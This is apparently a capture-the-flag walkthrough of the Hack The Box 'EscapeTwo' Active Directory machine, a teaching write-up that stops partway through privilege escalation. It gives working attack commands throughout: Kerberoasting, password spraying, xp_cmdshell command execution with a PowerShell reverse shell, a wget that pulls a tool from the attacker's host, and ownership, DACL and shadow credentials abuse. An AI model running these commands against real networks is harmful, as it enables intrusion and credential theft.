+++
tags = ["Box", "HTB", "Easy", "Windows", "LDAP", "Active Directory", "Certificate", "CA", "WriteOwner", "MSSQL", "xp_cmdshell", "kerberoasting", "kerberos", "ESC4", "Shadow Credentials"]
draft = true
title = "EscapeTwo HTB Walkthrough"
author = "bloodstiller"
date = 2025-01-14
toc = true
bold = true
next = true
+++

## EscapeTwo Hack The Box Walkthrough/Writeup: {#escapetwo-hack-the-box-walkthrough-writeup}

-   <https://app.hackthebox.com/machines/EscapeTwo>


## How I use variables &amp; Wordlists: {#how-i-use-variables-and-wordlists}

-   **Variables**:
    -   In my commands you are going to see me use `$box`, `$user`, `$hash`, `$domain`, `$pass` often.
        -   I find the easiest way to eliminate type-os &amp; to streamline my process it is easier to store important information in variables &amp; aliases.
            -   `$box` = The IP of the box
            -   `$pass` = Passwords I have access to.
            -   `$user` = current user I am enumerating with.
                -   Depending on where I am in the process this can change if I move laterally.
            -   `$domain` = the domain name e.g. `sugarape.local` or `contoso.local`
            -   `$machine` = the machine name e.g. `DC01`
        -   Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information.

-   **Wordlists**:
    -   I have symlinks all setup so I can get to my passwords from `~/Wordlists` so if you see me using that path that's why. If you are on Kali and following on, you will need to go to `/usr/share/wordlists`
        -   I also use these additional wordlists:
            -   [Statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
            -   [SecLists](https://github.com/danielmiessler/SecLists)
            -   [Auto_Wordlists](https://github.com/carlospolop/Auto_Wordlists)


## 1. Enumeration: {#1-dot-enumeration}


### Assumed Breach Box: {#assumed-breach-box}

-   This box scenario assumes that the Active Directory (AD) environment has already been breached and that we have access to valid credentials.
    -   **User**: `rose`
    -   **Pass**: `KxEPkKe6R8su`
-   This approach reflects a more realistic model, given that direct breaches of AD environments from external footholds are increasingly rare today.
-   +Note+:
    -   Even with assumed credentials, I’ll still conduct my standard enumeration process as if I don’t have them.
        -   This ensures I don’t overlook any findings just because access is available.
        -   Comprehensive documentation of all discoveries remains essential.


### NMAP: {#nmap}


#### Basic Scans: {#basic-scans}

-   **Basic TCP Scan**:
    -   `nmap $box -Pn -oA TCPbasicScan`
        ```shell
        kali in HTB/BlogEntriesMade/EscapeTwo/scans/nmap  🍣 main  1GiB/7GiB | 0B/1GiB with /usr/bin/zsh
        🕙 07:55:29 zsh ❯ nmap $box -Pn -oA TCPbasicScan
        Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-13 07:56 GMT
        Nmap scan report for 10.129.146.182
        Host is up (0.038s latency).
        Not shown: 988 filtered tcp ports (no-response)
        PORT     STATE SERVICE
        53/tcp   open  domain
        88/tcp   open  kerberos-sec
        135/tcp  open  msrpc
        139/tcp  open  netbios-ssn
        389/tcp  open  ldap
        445/tcp  open  microsoft-ds
        464/tcp  open  kpasswd5
        593/tcp  open  http-rpc-epmap
        636/tcp  open  ldapssl
        1433/tcp open  ms-sql-s
        3268/tcp open  globalcatLDAP
        3269/tcp open  globalcatLDAPssl

        Nmap done: 1 IP address (1 host up) scanned in 4.44 seconds


        ```
    -   **Initial thoughts**:
        -   Pretty Standard affair for AD, DNS, Kerberos, RPC, LDAP but also MSSQL.


#### Comprehensive Scans: {#comprehensive-scans}

-   **In depth scan TCP**:

    -   `sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP`

    <!--listend-->

    ```shell
    kali in HTB/BlogEntriesMade/EscapeTwo/scans/nmap  🍣 main  1GiB/7GiB | 0B/1GiB with /usr/bin/zsh
    🕙 07:56:07 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP
    [sudo] password for kali:
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-13 07:56 GMT
    Nmap scan report for 10.129.146.182
    Host is up (0.045s latency).
    Not shown: 65509 filtered tcp ports (no-response)
    PORT      STATE SERVICE       VERSION
    53/tcp    open  domain        Simple DNS Plus
    88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-13 07:59:29Z)
    135/tcp   open  msrpc         Microsoft Windows RPC
    139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
    389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
    |_ssl-date: 2025-01-13T08:01:07+00:00; +1s from scanner time.
    | ssl-cert: Subject: commonName=DC01.sequel.htb
    | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
    | Not valid before: 2024-06-08T17:35:00
    |_Not valid after:  2025-06-08T17:35:00
    445/tcp   open  microsoft-ds?
    464/tcp   open  kpasswd5?
    593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
    | ssl-cert: Subject: commonName=DC01.sequel.htb
    | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
    | Not valid before: 2024-06-08T17:35:00
    |_Not valid after:  2025-06-08T17:35:00
    |_ssl-date: 2025-01-13T08:01:07+00:00; +1s from scanner time.
    1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
    | ms-sql-info:
    |   10.129.146.182:1433:
    |     Version:
    |       name: Microsoft SQL Server 2019 RTM
    |       number: 15.00.2000.00
    |       Product: Microsoft SQL Server 2019
    |       Service pack level: RTM
    |       Post-SP patches applied: false
    |_    TCP port: 1433
    | ms-sql-ntlm-info:
    |   10.129.146.182:1433:
    |     Target_Name: SEQUEL
    |     NetBIOS_Domain_Name: SEQUEL
    |     NetBIOS_Computer_Name: DC01
    |     DNS_Domain_Name: sequel.htb
    |     DNS_Computer_Name: DC01.sequel.htb
    |     DNS_Tree_Name: sequel.htb
    |_    Product_Version: 10.0.17763
    |_ssl-date: 2025-01-13T08:01:07+00:00; +1s from scanner time.
    | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
    | Not valid before: 2025-01-13T07:53:13
    |_Not valid after:  2055-01-13T07:53:13
    3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
    | ssl-cert: Subject: commonName=DC01.sequel.htb
    | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
    | Not valid before: 2024-06-08T17:35:00
    |_Not valid after:  2025-06-08T17:35:00
    |_ssl-date: 2025-01-13T08:01:07+00:00; +1s from scanner time.
    3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
    |_ssl-date: 2025-01-13T08:01:07+00:00; +1s from scanner time.
    | ssl-cert: Subject: commonName=DC01.sequel.htb
    | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
    | Not valid before: 2024-06-08T17:35:00
    |_Not valid after:  2025-06-08T17:35:00
    5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-title: Not Found
    |_http-server-header: Microsoft-HTTPAPI/2.0
    9389/tcp  open  mc-nmf        .NET Message Framing
    47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-server-header: Microsoft-HTTPAPI/2.0
    |_http-title: Not Found
    49664/tcp open  msrpc         Microsoft Windows RPC
    49665/tcp open  msrpc         Microsoft Windows RPC
    49666/tcp open  msrpc         Microsoft Windows RPC
    49667/tcp open  msrpc         Microsoft Windows RPC
    49685/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    49686/tcp open  msrpc         Microsoft Windows RPC
    49689/tcp open  msrpc         Microsoft Windows RPC
    49702/tcp open  msrpc         Microsoft Windows RPC
    49718/tcp open  msrpc         Microsoft Windows RPC
    49737/tcp open  msrpc         Microsoft Windows RPC
    61431/tcp open  msrpc         Microsoft Windows RPC
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running (JUST GUESSING): Microsoft Windows 2019 (89%)
    Aggressive OS guesses: Microsoft Windows Server 2019 (89%)
    No exact OS matches for host (test conditions non-ideal).
    Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

    Host script results:
    | smb2-time:
    |   date: 2025-01-13T08:00:32
    |_  start_date: N/A
    | smb2-security-mode:
    |   3:1:1:
    |_    Message signing enabled and required
    |_clock-skew: mean: 1s, deviation: 0s, median: 0s

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 258.16 seconds

    ```

    -   **Findings**:


### LDAP `389`: {#ldap-389}


#### Using LDAP anonymous bind to enumerate further: {#using-ldap-anonymous-bind-to-enumerate-further}

-   If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.
    -   We can actually retrieve a significant amount of information via anonymous bind such as:
        -   A list of all users
        -   A list of all groups
        -   A list of all computers.
        -   User account attributes.
        -   The domain password policy.
        -   Enumerate users who are susceptible to AS-REPRoasting.
        -   Passwords stored in the description fields
    -   The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates.

-   I actually have a handy script to check if anonymous bind is enabled &amp; if it is to dump a large amount of information. You can find it here
    -   <https://github.com/bloodstiller/ldapire>
    -   <https://bloodstiller.com/cheatsheets/ldap-cheatsheet/#ldap-boxes-on-htb>
        -   `python3 /home/kali/windowsTools/enumeration/ldapire/ldapire.py $box -u $user -p $pass`
            -   It will dump general information &amp; also detailed &amp; simple information including:
                -   Groups
                -   Computers
                -   Users
                -   All domain objects
                -   A file containing all description fields
                -   It will also search the domain for any service/svc accounts and place them in a folder too.

<!--listend-->

1.  <span class="underline">We have the naming context of the domain</span>:
    ```shell
    kali in HTB/BlogEntriesMade/EscapeTwo/scans/ldap  🍣 main  1GiB/7GiB | 0B/1GiB with /usr/bin/zsh
    🕙 07:58:14 zsh ❯ python3 /home/kali/windowsTools/enumeration/ldapire/ldapire.py $box -u $user -p $pass


    ------------------------------------------------------------
     Server Information
    ------------------------------------------------------------
      • IP Address  : 10.129.146.182
      • Domain Name : sequel.htb
      • Server Name : DC01
      • Forest Level: 7
      • Domain Level: 7
    ```

<!--listend-->

-   It turns out the anonymous bind is (+NOT+) enabled and we get the below information &amp; our creds do not appear to work for the LDAP.
    ```shell

    ------------------------------------------------------------
     Connection Attempts
    ------------------------------------------------------------
      • Attempting SSL connection...
      ⚠️  Connection established but no read access
      • Attempting non-SSL connection...
      ⚠️  Connection established but no read access

    ------------------------------------------------------------
     Connection Failed
    ------------------------------------------------------------
      ⚠️  Could not establish LDAP connection
      • Anonymous bind may be disabled (good security practice)
      • Credentials may be incorrect
      • Server may be unreachable
      • LDAP/LDAPS ports may be filtered
    ```

    1.  <span class="underline">We have the domain functionality level</span>:
        ```shell
          • Forest Level: 7
          • Domain Level: 7
        ```

        -   The functionality level determines the minimum version of Windows server that can be used for a DC.
            -   +Note+: that any host os can be used on **workstations**, however the functionality level determines what the minimum version for DC's and the forest.
            -   <https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels>
            -   Knowing the function level is useful as if want to target the DC's and servers, we can know by looking at the function level what the minimum level of OS would be.

            -   In this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.
            -   Here’s a list of functional level numbers and their corresponding Windows Server operating systems:

                | Functional Level Number | Corresponding OS            |
                |-------------------------|-----------------------------|
                | 0                       | Windows 2000                |
                | 1                       | Windows Server 2003 Interim |
                | 2                       | Windows Server 2003         |
                | 3                       | Windows Server 2008         |
                | 4                       | Windows Server 2008 R2      |
                | 5                       | Windows Server 2012         |
                | 6                       | Windows Server 2012 R2      |
                | 7                       | Windows Server 2016         |
                | 8                       | Windows Server 2019         |
                | 9                       | Windows Server 2022         |

                -   +Note+:
                    -   Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest.
                    -   As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers.

    2.  <span class="underline">We have the full server name &amp; domain name</span>:
        ```shell
        ------------------------------------------------------------
         Server Information
        ------------------------------------------------------------
          • IP Address  : 10.129.146.182
          • Domain Name : sequel.htb
          • Server Name : DC01
        ```
-   It's pretty amazing already what we have learned just by running some fairly simple ldap queries.
    -   We have the naming context.
    -   Domain name.


#### Updating ETC/HOSTS &amp; Variables: {#updating-etc-hosts-and-variables}

-   **Updated Domain &amp; Machine Variables for Testing**:
    -   Now that I have this information, I can update the `domain` and `machine` variables used in tests:
        ```shell
        update_var domain "sequel.htb"
        update_var machine "DC01"
        ```

-   **Updating** `/etc/hosts` **for DNS and LDAP Queries**:
    -   I update my `/etc/hosts` file to enable tools like [kerbrute](https://github.com/ropnop/kerbrute) for user enumeration and other tools that require DNS or LDAP for queries:
        ```shell
        sudo echo "$box   $domain $machine.$domain $machine" | sudo tee -a /etc/hosts
        ```


#### Syncing Clocks for Kerberos Exploitation: {#syncing-clocks-for-kerberos-exploitation}

-   Since Kerberos is enabled on this host, it's best practice to sync our clock with the host’s. This helps avoid issues from clock misalignment, which can cause false negatives in Kerberos exploitation attempts.
    ```shell
    sudo ntpdate -s $domain
    ```

    -   +Note+: I am doing this now as we have the DNS name etc.


### DNS `53`: {#dns-53}

-   **Using dnsenum to enumerate DNS entries**:
    ```shell
    dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt $domain
    ```

    -   {{< figure src="/ox-hugo/2025-01-13-110410_.png" >}}
    -   Nothing out of the ordinary.


### Kerberos `88`: {#kerberos-88}


#### Using netexec or impacket for ASReproasting: {#using-netexec-or-impacket-for-asreproasting}

-   **We should always try and asreproast with a null/guest session as it can lead to an easy win**:
    ```shell
    netexec ldap $box -u $user -p $pass --asreproast asrep.txt
    ```

    -   {{< figure src="/ox-hugo/2025-01-13-081938_.png" >}}
    -   Nothing found.


#### Using netexec for Kerberoasting: {#using-netexec-for-kerberoasting}

-   **As we have creds we can kerberoast**:
    ```shell
    netexec ldap $box -u $user -p $pass --kerberoast kerb.txt

    ```

    -   {{< figure src="/ox-hugo/2025-01-13-082101_.png" >}}
    -   Two service accounts, `ca_svc` &amp; `sql_svc` are kerberoastable. I am assuming that ca will be Certificate Authority.


#### Attempting To Crack Kerberos Tickets: {#attempting-to-crack-kerberos-tickets}

-   I attempt to crack the kerberos tickets but they do not crack:
    ```shell
    hashcat -m 13100 kerb.txt ~/Wordlists/rockyou.txt
    ```
-   {{< figure src="/ox-hugo/2025-01-13-082617_.png" >}}
-   Lets move onto further enumeration.


### Performing a Bloodhound Collection: {#performing-a-bloodhound-collection}

-   I use bloodhound-python to perform a collection.
    ```shell
    bloodhound-python -d $domain -ns $box -c All -u $user -p $pass
    ```

    -   I then import these into bloodhound for investigation.
    -   {{< figure src="/ox-hugo/2025-01-13-083332_.png" >}}


### Bloodhound Findings: {#bloodhound-findings}

-   There is only 1 domain admin:
    -   {{< figure src="/ox-hugo/2025-01-13-084042_.png" >}}

-   Standard users have DC Sync Privileges:
    -   {{< figure src="/ox-hugo/2025-01-13-084133_.png" >}}

-   Our user has no overly permissive rights:
    -   {{< figure src="/ox-hugo/2025-01-13-084525_.png" >}}

-   Small domain with only 8 users:
    -   {{< figure src="/ox-hugo/2025-01-13-084440_.png" >}}

-   `sql_svc` looks to be a good target as it will most likely have access to the SQL server but is also a member of these groups:
    -   {{< figure src="/ox-hugo/2025-01-13-083806_.png" >}}

-   `ca_svc` is as suspected a member of the cert publishers group so can issue certs. We should look into using certipy-ad to enumerate the CA further.
    -   {{< figure src="/ox-hugo/2025-01-13-084003_.png" >}}


### Enumerating The CA Using Certipy-ad: {#enumerating-the-ca-using-certipy-ad}

```shell
certipy-ad find -vulnerable -u $user@$domain -p $pass -dc-ip $box
```

```shell
kali in content-org/Walkthroughs/HTB/BlogEntriesMade/EscapeTwo  🍣 main  3GiB/7GiB | 0B/1GiB with /usr/bin/zsh
🕙 08:34:09 zsh ❯ certipy-ad find -vulnerable -u $user@$domain -p $pass -dc-ip $box
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'sequel-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'sequel-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'sequel-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'sequel-DC01-CA'
[*] Saved BloodHound data to '20250113084633_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20250113084633_Certipy.txt'
[*] Saved JSON output to '20250113084633_Certipy.json'
```

-   I upload these to bloodhound but they do not work, so let's look at he `.json`
-   {{< figure src="/ox-hugo/2025-01-13-110520_.png" >}}
-   Our current user does not have access to any vulnerable templates.


### SMB `445`: {#smb-445}


#### Enumerating SMB shares using netexec: {#enumerating-smb-shares-using-netexec}

```shell
netexec smb $box -u $user -p $pass --shares
```

-   {{< figure src="/ox-hugo/2025-01-13-085238_.png" >}}
-   We have `READ` rights over the "Accounting Department" share


#### Enumerating the Accounting Department Share: {#enumerating-the-accounting-department-share}

I connect using smbclient:

```shell
smbclient -U $domain\\$user "\\\\$box\\Accounting Department"
```

-   There are two spreadsheets in the share:
    -   {{< figure src="/ox-hugo/2025-01-13-085645_.png" >}}

-   I download them both:
    -   {{< figure src="/ox-hugo/2025-01-13-085730_.png" >}}


#### Reading/Extracting Usernames &amp; Passwords From The Spreadsheets: {#reading-extracting-usernames-and-passwords-from-the-spreadsheets}

-   I try and open the spreadsheets using Open Office, but they appear to be cipher text:
    -   {{< figure src="/ox-hugo/2025-01-13-102258_.png" >}}

-   Luckily `.xlsx` are just file archives that contain spreadsheets. You can read more about them on [this page](https://fileinfo.com/extension/xlsx), however the key part is this (bolding added by me)

    > In Excel 2007, XLSX files replaced .XLS files as the standard file for saving spreadsheets in Excel. Unlike XLS files, which store spreadsheet data in a single binary file, **XLSX files are saved in the Open XML format, which stores data as separate files and folders in a compressed Zip package.** The archive includes the [Content_Types].xml file, which describes the spreadsheet, and an .XML file for each worksheet within the spreadsheet.

    -   This means we can manually extract the archive on our host to view the individual sheets contents.


##### Extracting the contents of the `xlsx` files manually: {#extracting-the-contents-of-the-xlsx-files-manually}

```shell
unzip accounting_2024.xlsx
unzip accounts.xlsx
```

-   {{< figure src="/ox-hugo/2025-01-13-111754_.png" >}}
-   {{< figure src="/ox-hugo/2025-01-13-112024_.png" >}}

-   Reading the file "`SharedStrings.xml`" from the `accounts.xlsx` extraction we can see clear text passwords and emails.
    -   {{< figure src="/ox-hugo/2025-01-13-112207_.png" >}}


##### Extracting the contents of the `xlsx` files online: {#extracting-the-contents-of-the-xlsx-files-online}

-   <https://jumpshare.com/viewer/xlsx>

-   `accounting_2024.xlsx` content:
    -   {{< figure src="/ox-hugo/2025-01-13-105951_.png" >}}

-   `accounts.xlsx` contains user credentials:
    -   {{< figure src="/ox-hugo/2025-01-13-110031_.png" >}}


##### Running Hashcat again: {#running-hashcat-again}

-   I re-run hashcat with newly extracted passwords against the extracted Kerberos tickets but they do not crack.


#### Testing Credentials: {#testing-credentials}

-   I test the newly found credentials and find that Oscars are also valid:
    ```shell
    netexec smb $box -u Users.txt -p Passwords.txt --continue-on-success | grep [+]
    ```

    -   {{< figure src="/ox-hugo/2025-01-13-114200_.png" >}}

-   Checking Bloodhound I can see that Oscar is a member of the `Accounting Department` group.
    -   {{< figure src="/ox-hugo/2025-01-13-114902_.png" >}}
    -   This group does not appear to have any interesting outbound object control however it's good to note he is part of this group for later on.
        -   {{< figure src="/ox-hugo/2025-01-13-114959_.png" >}}


## 2. Foothold: {#2-dot-foothold}


### Enumerating As Oscar: {#enumerating-as-oscar}

-   I check what shares we have access to as Oscar &amp; can see we have access to the `Users` share.

<!--listend-->

```shell
netexec smb $box -u $user -p $pass --shares
```

-   {{< figure src="/ox-hugo/2025-01-13-114321_.png" >}}


#### Accessing The Users Share As Oscar: {#accessing-the-users-share-as-oscar}

-   I use smbclient to access the share.
    ```shell
    smbclient -U $domain\\$user "\\\\$box\\Users"
    ```

    -   I check the "Default" folder present and it appears to be a default user installation of windows:
        -   Some initial enumeration does not yield any results
        -   {{< figure src="/ox-hugo/2025-01-13-121018_.png" >}}


### MSSQL `1433`: {#mssql-1433}


#### Enumerating The MSSQL Service: {#enumerating-the-mssql-service}

-   I check if the retrieved SQL credentials work against the MSSQL service using netexec:
    ```shell
    netexec mssql $box -u $user -p $pass --local-auth
    ```

    -   {{< figure src="/ox-hugo/2025-01-13-125005_.png" >}}
    -   It works and we can connect.

-   Even though our name is `sa` which would indicate it is a `sysadmin` I use the `mssql_priv` to check if they are and if not to elevate it.
    ```shell
    netexec mssql $box -u $user -p $pass --local-auth -M mssql_priv
    ```

    -   {{< figure src="/ox-hugo/2025-01-13-130203_.png" >}}
    -   We are a sysadmin so let's connect and get a reverse shell.


#### Connecting to the MSSQL Service: {#connecting-to-the-mssql-service}

-   We can use impacket-mssqlclient to connect to the instance.
    ```shell
    impacket-mssqlclient $user@$box:$pass
    ```

    -   {{< figure src="/ox-hugo/2025-01-13-130617_.png" >}}
-   As we are a sysadmin we can enable `xp_cmdshell`


##### `xp_cmdshell` primer: {#xp-cmdshell-primer}

-   **Core Functionality**:
    -   Allows execution of Windows command shell (`cmd.exe`) commands directly from within SQL (+RCE+)
    -   Extended stored procedure that acts as a bridge between SQL Server and the operating system
    -   Returns command output as rows of text in the result set
    -   Limited to 8192 bytes for command strings

-   **Configuration Settings**:
    -   Disabled by default since SQL Server 2005
    -   Restricted to `sysadmin` role members only (which we are)


#### Enabling `xp_cmdshell` For RCE On The Host: {#enabling-xp-cmdshell-for-rce-on-the-host}

-   There are multiple ways we can enable `xp_cmdshell`, I will share two.

-   Manual method, from an MSSQL shell we can enter the below commands.
    ```sql
    -- Enable advanced options
    sp_configure 'show advanced options', 1;
    RECONFIGURE;

    -- Enable xp_cmdshell
    sp_configure 'xp_cmdshell', 1;
    RECONFIGURE;
    ```

-   Automatic method using `impacket-mssqlclient` built in functionality:
    -   Luckily impacket has built in functionality to enable this.
        ```sql
        -- Enable
        enable_xp_cmdshell
        RECONFIGURE
        ```
    -   {{< figure src="/ox-hugo/2025-01-13-134232_.png" >}}


### Using RCE VIA `xp_cmdshell` To Get A Reverse Shell: {#using-rce-via-xp-cmdshell-to-get-a-reverse-shell}

-   I test a command &amp; it works as expected. We have RCE of the underlying host.
    ```sql
    EXEC xp_cmdshell 'dir C:\';

    -- We run commands like
    EXEC xp_cmdshell '[Command]';
    ```

    -   {{< figure src="/ox-hugo/2025-01-13-134407_.png" >}}
    -   +Important Note+: I found that `xp_cmdshell` would default to off again after a period of time so I had to re-enable it to execute commands.

<!--listend-->

-   I go to [revshells](https://www.revshells.com/) and use the base64 encoded powershell example.
    -   I start my listener on my local host and then enter the powershell base64 encoded reverse shell as a command via `xp_cmdshell`:
        ```sql
        EXEC xp_cmdshell 'powershell -e [base64ReverseShell]'
        ```
    -   {{< figure src="/ox-hugo/2025-01-13-135414_.png" >}}
    -   It connects.


### Enumerating As `sql_svc`: {#enumerating-as-sql-svc}

-   I check for the user flag but it is not present, so this makes me think that our target user is the user `ryan` who is also listed on this machine. Looking at their profile in Bloodhound, we can see they are part of the "Management Department" group which looks like it could be a good target.
    -   {{< figure src="/ox-hugo/2025-01-13-171540_.png" >}}
    -   More importantly we can also see ryan has `WriteOwner` privileges over the `CA_SVC` account, which means we effectively have full control over that account if we can get control of him.
        -   {{< figure src="/ox-hugo/2025-01-13-183109_.png" >}}

<!--listend-->

-   I download winPEAs onto the host.
    ```powershell
    wget http://10.10.14.38:9000/winPEASany.exe -o peas.exe
    ```

    -   I run it but nothing immediately jumps out.

-   I check for contents of users descriptions &amp; info fields, incase there are any stored credentials:
    ```powershell
    Get-AdUser -Properties * -LDAPFilter '(&(objectCategory=user)(description=*))' | select samaccountname,description
    ```

    -   +Note+: This returns only users who's description field is not blank
        ```powershell
          Get-AdUser -Properties * -LDAPFilter '(&(objectCategory=user)(info=*))' | select samaccountname,info
        ```
    -   {{< figure src="/ox-hugo/2025-01-13-163750_.png" >}}

-   By manual enumeration I find the `sql_svc` password hardcoded in `C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI`
    -   {{< figure src="/ox-hugo/2025-01-13-181705_.png" >}}
    -   I verify it's valid:
        -   {{< figure src="/ox-hugo/2025-01-13-181851_.png" >}}
    -   +Note+: I actually wasted a lot of times on winPEAS etc when simple manual enumeration would have gotten me here far quicker. It's important to not become too reliant on automated tools.


### Discovering Password Re-use for `ryan` &amp; `sql_svc`: {#discovering-password-re-use-for-ryan-and-sql-svc}

-   I perform password spraying with the password found in the `sql-Configuration.INI` file and find that the user `sql_svc` &amp; `ryan` both share the same password.
    ```shell
    netexec smb $box -u Users.txt -p Passwords.txt --shares --continue-on-success
    ```

    -   {{< figure src="/ox-hugo/2025-01-13-182350_.png" >}}


## 3. Lateral Movement: {#3-dot-lateral-movement}


### Connecting As Ryan: {#connecting-as-ryan}

-   I use evil-winrm to connect as Ryan
    ```shell
    evil-winrm -i $box -u $user -p $pass
    ```

    -   {{< figure src="/ox-hugo/2025-01-13-182533_.png" >}}

-   Lets get the user flag:
    -   {{< figure src="/ox-hugo/2025-01-13-183144_.png" >}}


## 4. Privilege Escalation: {#4-dot-privilege-escalation}


### Taking Control of `ca_svc`: {#taking-control-of-ca-svc}

-   As `ryan` we have the `WriteOwner` privilege over `CA_SVC` so we effectively own the account.


#### `WriteOwner` Privilege Primer: {#writeowner-privilege-primer}

-   **If we have** `WriteOwner` **over a**:
    -   <span class="underline">User</span>:
        -   We can assign all rights to another account which will allow us to perform a Password Reset via a **Force Change Password Attack**, **Targeted Kerberoasting Attack** or a **Shadow Credentials Attack**.
            -   I would like to perform a targeted Kerberoasting Attack or Shadow Credentials attack, mainly as I do not like changing users passwords if I don't have to.
    -   <span class="underline">Group</span>:
        -   We can add or remove members after we grant the new owner (which we control full privileges)
    -   <span class="underline">GPO</span>:
        -   We can modify it.
        -   GPO Attacks as well other DACL abuses (such as computer attacks).


#### Targeted Kerberoasting Attack Primer: {#targeted-kerberoasting-attack-primer}

-   To perform this attack we need 1 of these rights over the user:
    -   `WriteOwner`
    -   `GenericAll`
    -   `GenericWrite`
    -   `WriteProperty`
    -   `Validated-SPN`
    -   `WriteProperties`
-   Luckily as we have `WriteOwner` which means we have the ability to modify object security descriptors, regardless of permissions on the object's DACL.

+This works by doing the following:+

1.  Attach/generate an SPN for the user account.
2.  Request TGS for the user account.
3.  As TGS is encrypted with NTLM password hash we can then attempt to crack and overtake user account.
    -   Luckily [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast) does steps 1-2 automatically.


#### Attack Chain Attempt 1: Targeted Kerberoasting: {#attack-chain-attempt-1-targeted-kerberoasting}

-   **Attack Chain**:
    -   Perform a Targeted Kerberoasting Attack to get the hash of the `ca_svc` user.
    -   Attempt to crack the hash.

<!--listend-->

```shell
python3 targetedKerberoast.py -v -d $domain -u $user -p $pass --request-user ca_svc -o ca_svc.kerb
```

-   {{< figure src="/ox-hugo/2025-01-14-065141_.png" >}}

-   I attempt to crack the hash but it does not crack.
    -   {{< figure src="/ox-hugo/2025-01-14-065618_.png" >}}


#### Attack Chain Attempt 2: Shadow Credentials Attack: {#attack-chain-attempt-2-shadow-credentials-attack}

-  I have a full article explaining how the shadow credentials attack works here:
    -   <https://bloodstiller.com/articles/shadowcredentialsattack/>

-  **Attack Chain**:
    -   Make ourselves Owner of the `ca_svc` user account.
        -   Using `impacket-owneredit`.
    -   Grant ourselves full privileges over the `ca_svc` account.
        -   Using `impacket-dacledit`.
    -   Perform Shadow Credentials Attack.
        -   Using `pywhisker`.
    -   Use `gettgtpkinit` to create a `.ccache`.
    -   Use `getnthash` to extract the NT has of the `ca_svc` user.
-  +Note+: Some of these tools can be finicky to install. I have a post here - <https://bloodstiller.com/walkthroughs/certified-box/#performing-the-shadow-credentials-attack-against-management-svc> which details how to install each of the tools and issues you may face.

1.  **Modify ownership so** `Ryan` **has full control of** `ca_svc`:
    ```shell
    impacket-owneredit -action write -new-owner 'ryan' -target 'ca_svc' $domain/$user:$pass
    ```

    -   {{< figure src="/ox-hugo/2025-01-14-071358_.png" >}}

5.  **Grant** `ryan` **full privileges over the user** `ca_svc`:
    ```shell
    impacket-dacledit -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' $domain/$user:$pass
    ```

    -   {{< figure src="/ox-hugo/2025-01-14-071326_.png" >}}

6.  **Add shadow credentials to the** `ca_svc` **account &amp; export** `.PEM`
    ```shell
    python3 pywhisker.py -d $domain -u $user -p $pass --target "CA_SVC" --action "add" --filename CACert --export PEM
    ```

    -   {{< figure src="/ox-hugo/2025-01-14-071341_.png" >}}
        -   Ignore the capitlization of `CA_SVC` it doesn't matter.
    -   +Deep Dive+: I have a deep dive on shadow credentials available here if you want to the how behind this attack vector:
        -   <https://bloodstiller.com/articles/shadowcredentialsattack/>

7.  **Requesting a TGT for** `ca_svc` **with PKINITtools getgtgkinit**
    -   Now we perform the same process again to be able to extract their hash by using the `.pem` files we have retrieved to export a `.ccache` we can authenticate with.
        ```shell
